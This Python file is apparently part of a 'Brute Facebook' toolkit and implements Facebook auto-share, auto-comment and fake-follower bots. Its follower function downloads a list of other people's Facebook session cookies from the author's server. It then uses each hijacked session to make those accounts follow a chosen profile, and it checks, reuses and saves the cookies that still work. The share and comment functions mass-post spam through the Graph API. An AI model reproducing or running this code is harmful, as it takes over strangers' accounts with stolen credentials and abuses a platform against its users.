#######################################################
# Name           : Brute Facebook (BF)                #
# File           : bot_fb.py                          #
# Author         : Moch Yayan Juan Alvredo XD.        #
# Github         : https://github.com/Yayan-XD        #
# Facebook       : https://www.facebook.com/KM39453   #
# Website        : https://www.yayanxd.my.id          #
# Python version : 0.4                                #
#######################################################

############# DON'T REMOVE THIS FUNCTIONS #############

import requests, time, json, sys, datetime, re
from bs4 import BeautifulSoup as par
from datetime import datetime
#----------- MODULE RICH -------------
from rich import print as prints
from rich.panel import Panel
#----------- MODULE RICH -------------
from yz import cok as sayang
from data.dump import Dump
from .logo import Logo

N = '\x1b[0m'    # WARNA MATI
H = '\x1b[1;92m' # HIJAU
M = '\x1b[1;91m' # MERAH
O = '\x1b[1;96m' # BIRU MUDA

class Bot_Facebook:

    def __init__(self, cookie, tokenz):
        self.xzx, self.no = [], 0
        self.ses = requests.Session()
        self.cok, self.tok = cookie, tokenz
        self.url = "https://mbasic.facebook.com"
        self.xxx = "https://api-cdn-fb.yayanxd.my.id/submit.php"
        self.menu()

    def menu(self):
        Logo()
        prints(Panel("""[[bold cyan]01[/]] bot auto share       [[bold cyan]04[/]] bot auto komen group
[[bold cyan]02[/]] bot auto komen       [[bold cyan]05[/]] bot like postingan
[[bold cyan]03[/]] bot followers        [[bold red]00[/]] kembali""", style="bold white", padding=(0,5), width=70, title="[bold green]MENU BOT"))
        cok = input("╰──> ")
        if cok in ["", " "]:
            prints(Panel("[[bold red]![/]] jangan kosong", style="bold white", width=70));time.sleep(2);self.menu()
        elif cok in ["1", "01"]:
            self.share()
        elif cok in ["2", "02"]:
            self.komen()
        elif cok in ["3", "03"]:
            self.dumps()
            self.folow()
        elif cok in ["4", "04"]:
            exit("belum tersedia")
            #self.group()
        elif cok in ["5", "05"]:
            exit("belum tersedia")
            #self.likee()
        elif cok in ["0", "00"]:
            sayang.Cindy_aulia()
        else:
            prints(Panel("[[bold red]![/]] input yang bener", style="bold white", width=70));time.sleep(2);self.menu()

    def dumps(self):
        try:
            req = self.ses.get(f"{self.xxx}?json=true").json()
            for x in req:
                for key, value in x.items():
                    self.xzx.append(key+"|"+value)
                    sys.stdout.write(f"\r[{O}*{N}] sedang mengumpulkan {H}{len(self.xzx)}{N} user... ");sys.stdout.flush()
        except:pass

    def share(self):
        prints(Panel("      [bold green]masukan link post yang mau anda pasang bot share.", style="bold white", width=70))
        link = input("╰──> ")
        prints(Panel("   [bold green]masukan limit postingan yang mau anda pasang bot share.", style="bold white", width=70))
        limi = int(input("╰──> "))
        print()
        waktu = datetime.now()
        try:
            header = {"authority":"graph.facebook.com","cache-control":"max-age=0","sec-ch-ua-mobile":"?0","user-agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1"}
            for x in range(limi):
                self.no+=1
                post = self.ses.post(f"https://graph.facebook.com/v13.0/me/feed?link={link}&published=0&access_token={self.tok}",headers=header, cookies=self.cok).text
                data = json.loads(post)
                prints(data)
                if "id" in post:
                    hasil = str(datetime.now()-waktu).split('.')[0]
                    titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
                    for x in titik:
                        sys.stdout.write(f"\r[{H}{hasil}{N}] proses share {H}{self.no}{N} postingan{x}{N}");sys.stdout.flush()
                else:
                    prints(Panel("[bold red]gagal share postingan, kemungkinan akun terkena limit.", style="bold white", width=70));exit()
            print()
            prints(Panel(f"             [[bold green]✓[/]] berhasil share [bold green]{limi}[/] postingan             ", style="bold white", width=70))
            input(f"[ {O}TEKAN ENTER {N} ] ");self.menu()
        except:pass

    def komen(self):
        prints(Panel("      [bold green]masukan link post yang mau anda pasang bot komen.", style="bold white", width=70))
        link = input("╰──> ")
        try:
            self.ses.headers.update({"user-agent": "Mozilla/5.0 (Linux; Android 7.0; TRT-LX2 Build/HUAWEITRT-LX2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36"})
            urll = self.ses.get(link).text
            cari = re.search('"MUFI","init",\[],\["(\d*)"', urll).group(1)
        except Exception:
            prints(Panel("[bold red]  gagal memasang bot komen, pastikan postingan anda publik.", style="bold white", width=70));self.komen()
        prints(Panel("[bold green]            gunakan '[bold cyan]<>[/]' untuk spasi kata2 nya...", style="bold white", width=70))
        komm = input("╰──> ").replace("<>", "\n")
        prints(Panel("   [bold green]masukan limit postingan yang mau anda pasang bot komen.", style="bold white", width=70))
        limi = int(input("╰──> "))
        print()
        waktu = datetime.now()
        try:
            header = {"authority":"graph.facebook.com","cache-control":"max-age=0","sec-ch-ua-mobile":"?0","user-agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1"}
            for x in range(limi):
                self.no+=1
                post = self.ses.post(f"https://graph.facebook.com/{cari}/comments/?message={komm}&access_token={self.tok}",headers=header, cookies=self.cok).text
                data = json.loads(post)
                if "error" in data:
                    prints(Panel(f"[bold red]{data['error']['message']}", style="bold white", width=70, title="[bold red]ERROR"));exit()
                else:
                    hasil = str(datetime.now()-waktu).split('.')[0]
                    titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
                    for x in titik:
                        sys.stdout.write(f"\r[{H}{hasil}{N}] proses komen {H}{self.no}{N} postingan{x}{N}");sys.stdout.flush()
            print()
            prints(Panel(f"             [[bold green]✓[/]] berhasil komen [bold green]{limi}[/] postingan             ", style="bold white", width=70))
            input(f"[ {O}TEKAN ENTER {N} ] ");self.menu()
        except:pass

    def folow(self):
        print();prints(Panel("Silahkan salin url akun facebook anda, yang ingin di tambah followers.", style="bold white", width=70))
        try:urll = input(f"[{O}?{N}] url akun : ");user = Dump("", "").convert(urll)
        except(KeyError, IndexError):print(f"\n{N}[{M}×{N}] url tidak benar");time.sleep(3);self.folow()
        prints(Panel("    Tunggu sebentar, sendang mengirim followers ke akun anda.", style="bold white", width=70))
        for id in self.xzx:
            time.sleep(1)
            nama, coki = id.split("|")[0], id.split("|")[1]
            self.kirim(nama, coki, user)
        print();prints(Panel("          Bot followers berhasil di gunanakan", style="bold white", width=70))
        input(f"[ {O}TEKAN ENTER {N} ] ");self.menu()

    def ubah_data(self, link, coki, nama):
        try:
            gett = self.ses.get(f"{self.url}/zero/optin/write/{link}", cookies={"cookie": coki}).text
            date = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(gett)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(gett)).group(1)}
            self.ses.post(self.url+par(gett, "html.parser").find("form",{"method":"post"})["action"], data=date, cookies={"cookie": coki})
            self.simpan(nama, coki)
        except:pass

    def simpan(self, user, pasw):
        kntl = (f"{user}|{pasw}")
        with open("coki_fb.txt", "a", encoding="utf-8") as r:
            r.write(kntl+"\n")

    def cek_coki_aktif(self, nama, coki, uid):
        self.no+=1
        try:
            link = par(self.ses.get(f"{self.url}/profile.php?id={uid}", cookies={"cookie":coki}).text, "html.parser")
            if "/zero/optin/write" in str(link):
                urll = re.search('href="/zero/optin/write/?(.*?)"', str(link)).group(1).replace("amp;", "")
                self.ubah_data(urll, coki, nama)
                prints(Panel(f"""[[bold green]+[/]] Nama   : {nama}
[[bold green]+[/]] Status : cookie aktif.""", width=70, style="bold white", title=f"[[bold blue]{self.no}[/]]"))
            elif "mbasic_logout_button" in str(link):
                self.simpan(nama, coki)
                prints(Panel(f"""[[bold green]+[/]] Nama   : {nama}
[[bold green]+[/]] Status : cookie aktif.""", width=70, style="bold white", title=f"[[bold blue]{self.no}[/]]"))
            else:prints(Panel(f"""[[bold red]![/]] Nama   : {nama}
[[bold red]![/]] Status : Coki gak aktif.""", width=70, style="bold white", title=f"[[bold blue]{self.no}[/]]"))
        except:pass

    def kirim(self, nama, coki, uid):
        self.no+=1
        try:
            link = par(self.ses.get(f"{self.url}/profile.php?id={uid}", cookies={"cookie":coki}).text, "html.parser")
            if "/a/subscribe.php" in str(link):
                cari = re.search('/a/subscribe.php(.*?)"', str(link)).group(1).replace("amp;", "")
                self.ses.get(f"{self.url}/a/subscribe.php{cari}", cookies={"cookie": coki})
                prints(Panel(f"""[[bold green]+[/]] Nama   : {nama}
[[bold green]+[/]] Status : Akun ini berhasil mengikuti akun anda.""", width=70, style="bold white", title=f"[[bold blue]{self.no}[/]]"))
            elif "/login/?privacy_mutation_token" in str(link):
                prints(Panel(f"""[[bold red]![/]] Nama   : {nama}
[[bold red]![/]] Status : Gagal mengikuti akun anda.""", width=70, style="bold white", title=f"[[bold blue]{self.no}[/]]"))
            elif "/a/subscriptions/remove" in str(link):
                prints(Panel(f"""[[bold yellow]![/]] Nama   : {nama}
[[bold yellow]![/]] Status : Akun ini sudah mengikuti akun anda.""", width=70, style="bold white", title=f"[[bold blue]{self.no}[/]]"))
            else:pass
        except:pass